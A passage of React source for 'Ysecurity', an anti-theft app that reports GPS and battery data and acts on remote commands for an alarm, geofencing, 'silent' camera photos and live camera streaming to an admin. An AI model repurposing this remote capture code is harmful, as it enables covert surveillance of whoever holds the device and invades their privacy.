        { ...pingData, deviceId: id },
      ];
      setPendingPings(updated);
      pendingPingsRef.current = updated;
      await savePendingPings(updated);
      return;
    }

    try {
      const response = await fetch(`${API_BASE}/devices/${id}/ping`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(pingData),
      });
      if (response.ok) {
        setLastPingTime(new Date());
        setPingCount((prev) => prev + 1);
      } else {
        const errData = await response.json().catch(() => ({}));
        console.warn("[YS] Ping rejected:", errData.error || response.status);
      }
    } catch (err) {
      // Network error — queue for later
      const updated = [
        ...pendingPingsRef.current,
        { ...pingData, deviceId: id },
      ];
      setPendingPings(updated);
      pendingPingsRef.current = updated;
      await savePendingPings(updated);
    }
  };

  const syncPendingPings = async () => {
    if (!isOnlineRef.current || pendingPingsRef.current.length === 0) return;
    console.log(`[YS] Syncing ${pendingPingsRef.current.length} pending pings`);
    const failed = [];
    for (const ping of pendingPingsRef.current) {
      const pingDeviceId = ping.deviceId || deviceIdRef.current;
      if (!pingDeviceId) {
        failed.push(ping);
        continue;
      }
      try {
        const res = await fetch(`${API_BASE}/devices/${pingDeviceId}/ping`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(ping),
        });
        if (!res.ok) failed.push(ping);
      } catch (e) {
        failed.push(ping);
      }
    }
    setPendingPings(failed);
    pendingPingsRef.current = failed;
    await savePendingPings(failed);
  };

  // =============================================
  // COMMAND EXECUTION (production-ready)
  // =============================================
  const executeCommand = async (cmd) => {
    const currentDeviceId = deviceIdRef.current;
    console.log(`[YS] Executing command: ${cmd.command}`, cmd.params);

    try {
      switch (cmd.command) {
        case "alarm":
          await executeAlarm();
          break;

        case "camera":
          await executeCamera(cmd, currentDeviceId);
          break;

        case "geofence": {
          const params =
            typeof cmd.params === "string"
              ? JSON.parse(cmd.params)
              : cmd.params;
          setGeofence(params);
          geofenceRef.current = params;
          await store.set("geofence", JSON.stringify(params));
          console.log("[YS] Geofence set:", params);
          break;
        }

        default:
          console.warn("[YS] Unknown command:", cmd.command);
          break;
      }

      // Mark command as executed on server
      if (cmd.id) {
        try {
          await fetch(`${API_BASE}/commands/${cmd.id}/executed`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
          });
          console.log(`[YS] Command ${cmd.id} marked executed`);
        } catch (err) {
          console.error("[YS] Failed to mark command executed:", err);
        }
      }
    } catch (err) {
      console.error("[YS] Command execution failed:", err);
    }
  };

  const executeAlarm = async () => {
    console.log("[YS] Triggering alarm");
    try {
      // Vibrate pattern — long continuous
      navigator.vibrate?.([1000, 300, 1000, 300, 1000, 300, 1000, 300, 1000]);

      // Create loud alarm using Web Audio API
      const ctx = new (window.AudioContext || window.webkitAudioContext)();

      // Resume AudioContext if suspended (required after user interaction policy)
      if (ctx.state === "suspended") {
        await ctx.resume();
      }

      const playTone = (freq, start, dur, vol = 0.8) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.frequency.value = freq;
        osc.type = "sawtooth"; // More aggressive sound than default sine
        gain.gain.setValueAtTime(vol, ctx.currentTime + start);
        gain.gain.exponentialRampToValueAtTime(
          0.01,
          ctx.currentTime + start + dur,
        );
        osc.start(ctx.currentTime + start);
        osc.stop(ctx.currentTime + start + dur);
      };

      // 10-second siren pattern: alternating high/low with aggressive waveform
      for (let i = 0; i < 20; i++) {
        playTone(i % 2 === 0 ? 880 : 587, i * 0.5, 0.5, 0.8);
      }

      // Also try to play via vibrate for longer
      setTimeout(() => {
        navigator.vibrate?.([1000, 200, 1000, 200, 1000, 200, 1000]);
      }, 5000);

      console.log("[YS] Alarm triggered successfully");
    } catch (e) {
      console.warn("[YS] Alarm playback failed:", e);
    }
  };

  const executeCamera = async (cmd, currentDeviceId) => {
    console.log("[YS] Capturing camera photo");
    try {
      let base64Photo = null;
      const cameraParams =
        typeof cmd.params === "string"
          ? JSON.parse(cmd.params)
          : cmd.params || {};
      const facing = cameraParams.facing || "front";
      const facingMode = facing === "back" ? "environment" : "user";

      if (isNative && Camera) {
        const image = await Camera.getPhoto({
          quality: 90,
          allowEditing: false,
          resultType: "base64",
          direction: facing === "back" ? "REAR" : "FRONT",
          source: "CAMERA",
        });
        base64Photo = image.base64String;
      } else if (
        navigator.mediaDevices &&
        navigator.mediaDevices.getUserMedia
      ) {
        // Web: capture photo silently
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
        });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.setAttribute("playsinline", "true");
        video.setAttribute("muted", "true");
        await video.play();

        // Wait for video dimensions to be available
        await new Promise((resolve) => {
          const check = () => {
            if (video.videoWidth > 0 && video.videoHeight > 0) resolve();
            else setTimeout(check, 100);
          };
          check();
        });

        // Small delay to let camera adjust exposure
        await new Promise((r) => setTimeout(r, 800));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        base64Photo = canvas.toDataURL("image/jpeg", 0.85).split(",")[1];
        stream.getTracks().forEach((t) => t.stop());
        console.log(
          `[YS] Photo captured: ${facing} camera, ${(base64Photo.length / 1024).toFixed(0)}KB`,
        );
      }

      if (base64Photo && currentDeviceId) {
        const uploadResponse = await fetch(
          `${API_BASE}/devices/${currentDeviceId}/photo`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ photo: base64Photo }),
          },
        );
        if (uploadResponse.ok) {
          console.log("[YS] Photo uploaded successfully");
        } else {
          console.warn("[YS] Photo upload failed:", uploadResponse.status);
        }
      }
    } catch (e) {
      console.error("[YS] Camera capture failed:", e);
    }
  };

  // =============================================
  // LIVE CAMERA STREAMING
  // =============================================
  const startCameraStream = async (socketConn, facing) => {
    // Stop any existing stream first
    stopCameraStream();

    const facingMode = facing === "back" ? "environment" : "user";
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
      });
      cameraStreamRef.current = stream;

      const video = document.createElement("video");
      video.srcObject = stream;
      video.setAttribute("playsinline", "true");
      video.setAttribute("muted", "true");
      await video.play();
      cameraVideoRef.current = video;

      // Wait for video to be ready
      await new Promise((resolve) => {
        const check = () => {
          if (video.videoWidth > 0 && video.videoHeight > 0) resolve();
          else setTimeout(check, 100);
        };
        check();
      });

      // Let camera adjust exposure
      await new Promise((r) => setTimeout(r, 500));

      // Notify admin that stream is active
      const sock = socketConn || socketRef.current;
      if (sock) {
        sock.emit("camera-stream-started", {
          deviceId: deviceIdRef.current,
          facing,
          width: video.videoWidth,
          height: video.videoHeight,
        });
      }

      // Send frames at ~2 FPS (every 500ms)
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");

      cameraIntervalRef.current = setInterval(() => {
        if (!cameraStreamRef.current || !video.srcObject) {
          stopCameraStream();
          return;
        }
        try {
          ctx.drawImage(video, 0, 0);
          const frame = canvas.toDataURL("image/jpeg", 0.5).split(",")[1];
          const sock = socketRef.current;
          if (sock && sock.connected) {
            sock.emit("camera-frame", {
              deviceId: deviceIdRef.current,
              frame,
              timestamp: Date.now(),
            });
          }
        } catch (e) {
          console.warn("[YS] Frame capture error:", e);
        }
      }, 500);

      console.log(
        `[YS] Camera stream started: ${facing}, ${video.videoWidth}x${video.videoHeight}`,
      );
    } catch (e) {
      console.error("[YS] Failed to start camera stream:", e);
      const sock = socketConn || socketRef.current;
      if (sock) {
        sock.emit("camera-stream-error", {
          deviceId: deviceIdRef.current,
          error: e.message || "Camera access denied",
        });
      }
    }
  };

  const stopCameraStream = () => {
    if (cameraIntervalRef.current) {
      clearInterval(cameraIntervalRef.current);
      cameraIntervalRef.current = null;
    }
    if (cameraStreamRef.current) {
      cameraStreamRef.current.getTracks().forEach((t) => t.stop());
      cameraStreamRef.current = null;
    }
    if (cameraVideoRef.current) {
      cameraVideoRef.current.srcObject = null;
      cameraVideoRef.current = null;
    }
    const sock = socketRef.current;
    if (sock && sock.connected) {
      sock.emit("camera-stream-stopped", { deviceId: deviceIdRef.current });
    }
    console.log("[YS] Camera stream stopped");
  };

  const takeCameraSnapshot = async () => {
    const video = cameraVideoRef.current;
    if (!video || !cameraStreamRef.current) {
      console.warn("[YS] No active camera stream for snapshot");
      return;
    }
    try {
      // High quality snapshot
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      const base64Photo = canvas.toDataURL("image/jpeg", 0.9).split(",")[1];

      const currentDeviceId = deviceIdRef.current;
      if (base64Photo && currentDeviceId) {
        const uploadResponse = await fetch(
          `${API_BASE}/devices/${currentDeviceId}/photo`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ photo: base64Photo }),
          },
        );
        if (uploadResponse.ok) {
          const data = await uploadResponse.json();
          console.log("[YS] Snapshot saved:", data.filename);
          // Notify admin that snapshot was saved
          const sock = socketRef.current;
          if (sock && sock.connected) {
            sock.emit("camera-snapshot-saved", {
              deviceId: currentDeviceId,
              filename: data.filename,
            });
          }
        }
      }
    } catch (e) {
      console.error("[YS] Snapshot failed:", e);
    }
  };

  // =============================================
  // HELPERS
  // =============================================
  const getDistance = (lat1, lng1, lat2, lng2) => {
    const R = 6371e3;
    const p1 = (lat1 * Math.PI) / 180;
    const p2 = (lat2 * Math.PI) / 180;
    const dp = ((lat2 - lat1) * Math.PI) / 180;
    const dl = ((lng2 - lng1) * Math.PI) / 180;
    const a =
      Math.sin(dp / 2) * Math.sin(dp / 2) +
      Math.cos(p1) * Math.cos(p2) * Math.sin(dl / 2) * Math.sin(dl / 2);
    return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  };

  const formatTime = (date) => {
    if (!date) return "—";
    const d = new Date(date);
    return d.toLocaleTimeString([], {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });
  };

  // =============================================
  // RENDER
  // =============================================

  const styles = {
    container: {
      minHeight: "100vh",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      fontFamily:
        '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
      background:
        "linear-gradient(135deg, #0a1628 0%, #1a237e 50%, #0d47a1 100%)",
      color: "#fff",
      padding: "20px",
    },
    card: {
      background: "rgba(255,255,255,0.08)",
      backdropFilter: "blur(20px)",
      borderRadius: "20px",
      padding: "40px 30px",
      width: "100%",
      maxWidth: "380px",
      boxShadow: "0 8px 32px rgba(0,0,0,0.3)",
      border: "1px solid rgba(255,255,255,0.1)",
    },
    input: {
      width: "100%",
      padding: "14px 16px",
      borderRadius: "12px",
      border: "1px solid rgba(255,255,255,0.2)",
      background: "rgba(255,255,255,0.06)",
      color: "#fff",
      fontSize: "16px",
      outline: "none",
      marginBottom: "16px",
      boxSizing: "border-box",
    },
    button: {
      width: "100%",
      padding: "16px",
      borderRadius: "12px",
      border: "none",
      background: "linear-gradient(135deg, #1a73e8, #0d47a1)",
      color: "#fff",
      fontSize: "16px",
      fontWeight: "600",
      cursor: "pointer",
      marginTop: "8px",
    },
    error: {
      background: "rgba(244,67,54,0.15)",
      border: "1px solid rgba(244,67,54,0.3)",
      borderRadius: "12px",
      padding: "12px 16px",
      marginBottom: "16px",
      fontSize: "14px",
      color: "#ff8a80",
    },
  };

  // LOADING SCREEN
  if (screen === SCREEN.LOADING) {
    return (
      <div style={styles.container}>
        <div style={{ fontSize: "48px", marginBottom: "20px" }}>🛡️</div>
        <div style={{ fontSize: "14px", opacity: 0.7 }}>Initializing...</div>
      </div>
    );
  }

  // LOGIN SCREEN
  if (screen === SCREEN.LOGIN) {
    const isAndroidBrowser = /Android/.test(navigator.userAgent) && !isNative;

    return (
      <div style={styles.container}>
        <div style={styles.card}>
          <div style={{ textAlign: "center", marginBottom: "30px" }}>
            <div style={{ fontSize: "48px", marginBottom: "12px" }}>🛡️</div>
            <h1
              style={{ margin: "0 0 8px", fontSize: "24px", fontWeight: "700" }}
            >
              Ysecurity
            </h1>
            <p style={{ margin: 0, fontSize: "14px", opacity: 0.7 }}>
              Device Security &amp; Anti-Theft Protection
            </p>
          </div>

          {error && <div style={styles.error}>{error}</div>}

          {deferredPrompt && (
            <button
              style={{
                ...styles.button,
                background: "linear-gradient(135deg, #ff6b35, #f7931e)",
                fontSize: "16px",
                padding: "14px",
                marginBottom: "12px",
                cursor: "pointer",
              }}
              onClick={handleInstall}
            >
              📱 Install App on Device
            </button>
          )}

          {isAndroidBrowser && (
            <a
              href="/download/android"
              style={{
                ...styles.button,
                display: "block",
                background: "linear-gradient(135deg, #1a73e8, #1565c0)",
                fontSize: "17px",
                padding: "16px",
                marginBottom: "12px",
                textAlign: "center",
                textDecoration: "none",
                color: "#fff",
                borderRadius: "14px",
              }}
            >
              📲 Download Android App (Recommended)
            </a>
          )}

          <button
            style={{
              ...styles.button,
              background: isAndroidBrowser
                ? "rgba(255,255,255,0.08)"
                : "linear-gradient(135deg, #4caf50, #2e7d32)",
              fontSize: isAndroidBrowser ? "15px" : "18px",
              padding: isAndroidBrowser ? "14px" : "18px",
              marginBottom: "20px",
              opacity: isLoggingIn ? 0.6 : 1,
              cursor: isLoggingIn ? "not-allowed" : "pointer",
              border: isAndroidBrowser
                ? "1px solid rgba(255,255,255,0.15)"
                : "none",
            }}
            onClick={handleTestMode}
            disabled={isLoggingIn}
          >
            {isLoggingIn
              ? "⏳ Installing..."
              : isAndroidBrowser
                ? "Or continue with web version"
                : "🛡️ Install Protection Now"}
          </button>
        </div>
      </div>
    );
  }

  // INSTALLING SCREEN
  if (screen === SCREEN.INSTALLING) {
    return (
      <div style={styles.container}>
        <div style={styles.card}>
          <div style={{ textAlign: "center" }}>
            <div
              style={{
                fontSize: "48px",
                marginBottom: "20px",
                animation: "pulse 1.5s infinite",
              }}
            >
              🛡️
            </div>
            <h2 style={{ margin: "0 0 12px", fontSize: "20px" }}>
              Installing Protection...
            </h2>
            <p style={{ fontSize: "14px", opacity: 0.7, margin: 0 }}>
              Setting up silent device monitoring
            </p>
            <div
              style={{
                width: "60%",
                height: "4px",
                background: "rgba(255,255,255,0.1)",
                borderRadius: "2px",
                margin: "24px auto 0",
                overflow: "hidden",
              }}
            >
              <div
                style={{
                  width: "100%",
                  height: "100%",
                  background: "linear-gradient(90deg, #1a73e8, #42a5f5)",
                  borderRadius: "2px",
                  animation: "progress 2.5s ease-in-out",
                }}
              />
            </div>
          </div>
        </div>
        <style>{`
          @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.1); } }
          @keyframes progress { 0% { width: 0; } 100% { width: 100%; } }
        `}</style>
      </div>
    );
  }

  // PERMISSIONS SCREEN
  if (screen === SCREEN.PERMISSIONS) {
    const handleGrantPermissions = async () => {
      await requestAllPermissions();
      setScreen(SCREEN.ACTIVE);
      // Start tracking after permissions
      startTracking(deviceId);
      initSocket(deviceId);
      startStatusChecks(deviceId);
      startCommandPolling(deviceId);
    };

    return (
      <div style={styles.container}>
        <div style={styles.card}>
          <div style={{ textAlign: "center", marginBottom: "24px" }}>
            <div style={{ fontSize: "48px", marginBottom: "12px" }}>🔐</div>
            <h2
              style={{ margin: "0 0 8px", fontSize: "20px", fontWeight: "700" }}
            >
              Grant Permissions
            </h2>
            <p style={{ margin: 0, fontSize: "14px", opacity: 0.7 }}>
              Allow camera, location, and other permissions for security
              tracking
            </p>
          </div>

          <button
            style={{
              ...styles.button,
              background: "linear-gradient(135deg, #1a73e8, #1565c0)",
              fontSize: "17px",
              padding: "16px",
            }}
            onClick={handleGrantPermissions}
          >
            Grant Permissions & Continue
          </button>
        </div>
      </div>
    );
  }

  // ACTIVE SCREEN — Dormant/Active with live status
  return (
    <div style={styles.container}>
      <div style={styles.card}>
        <div style={{ textAlign: "center", marginBottom: "24px" }}>
          <div style={{ fontSize: "48px", marginBottom: "12px" }}>
            {isActive ? "🟢" : "🛡️"}
          </div>
          <h1 style={{ margin: "0 0 4px", fontSize: "22px" }}>Ysecurity</h1>
          <p
            style={{
              margin: 0,
              fontSize: "14px",
              color: isActive ? "#69f0ae" : "rgba(255,255,255,0.5)",
              fontWeight: "600",
            }}
          >
            {isActive ? "ACTIVE — Tracking Enabled" : "INSTALLED — Dormant"}
          </p>
        </div>

        <div
          style={{
            background: "rgba(255,255,255,0.05)",
            borderRadius: "12px",
            padding: "16px",
            fontSize: "13px",
          }}
        >
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              marginBottom: "8px",
            }}
          >
            <span style={{ opacity: 0.6 }}>Network</span>
            <span>{isOnline ? "🟢 Online" : "🔴 Offline"}</span>
          </div>
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              marginBottom: "8px",
            }}
          >
            <span style={{ opacity: 0.6 }}>Server</span>
            <span>{isConnected ? "🟢 Connected" : "🔴 Disconnected"}</span>
          </div>
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              marginBottom: "8px",
            }}
          >
            <span style={{ opacity: 0.6 }}>GPS</span>
            <span>
              {gpsStatus === "granted"
                ? "🟢 Active"
                : gpsStatus === "denied"
                  ? "🔴 Denied"
                  : gpsStatus === "prompt"
                    ? "🟡 Waiting"
                    : navigator.geolocation
                      ? "🟡 Ready"
                      : "🔴 Unavailable"}
            </span>
          </div>
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              marginBottom: "8px",
            }}
          >
            <span style={{ opacity: 0.6 }}>Battery</span>
            <span>
              🔋 {batteryLevel >= 0 ? `${batteryLevel}%` : "Detecting..."}
            </span>
          </div>
          {isActive && lastPingTime && (
            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                marginBottom: "8px",
              }}
            >
              <span style={{ opacity: 0.6 }}>Last Ping</span>
              <span>{formatTime(lastPingTime)}</span>
            </div>
          )}
          {isActive && pingCount > 0 && (
            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                marginBottom: "8px",
              }}
            >
              <span style={{ opacity: 0.6 }}>Pings Sent</span>
              <span>{pingCount}</span>
            </div>
          )}
          {pendingPings.length > 0 && (
            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                marginBottom: "8px",
              }}
            >
              <span style={{ opacity: 0.6 }}>Queued Pings</span>
              <span style={{ color: "#ffab40" }}>{pendingPings.length}</span>
            </div>
          )}
          {geofence && (
            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                marginBottom: "8px",
              }}
            >
              <span style={{ opacity: 0.6 }}>Geofence</span>
              <span>🟣 {geofence.radius}m radius</span>
            </div>
          )}
        </div>

        {isActive && (
          <div
            style={{
              marginTop: "20px",
              padding: "16px",
              background: "rgba(76,175,80,0.15)",
              border: "1px solid rgba(76,175,80,0.3)",
              borderRadius: "12px",
              fontSize: "13px",
              textAlign: "center",
              color: "rgba(255,255,255,0.9)",
            }}
          >
            ✅ Device is being tracked. GPS location, battery, and network data
            are being sent to the server in real-time.
          </div>
        )}

        {isActive && gpsStatus === "denied" && (
          <div
            style={{
              marginTop: "12px",
              padding: "12px 16px",
              background: "rgba(244,67,54,0.15)",
              border: "1px solid rgba(244,67,54,0.3)",
              borderRadius: "12px",
              fontSize: "12px",
              textAlign: "center",
              color: "#ff8a80",
            }}
          >
            ⚠️ Location permission denied. Enable location in your
            browser/device settings for GPS tracking.
          </div>
        )}

        {!isActive && (
          <div
            style={{
              marginTop: "20px",
              padding: "16px",
              background: "rgba(255,193,7,0.1)",
              border: "1px solid rgba(255,193,7,0.2)",
              borderRadius: "12px",
              fontSize: "13px",
              textAlign: "center",
              color: "rgba(255,255,255,0.7)",
            }}
          >
            Protection is installed and dormant. It will be activated by the
            security team when needed.
          </div>
        )}
      </div>
    </div>
  );
}

export default App;
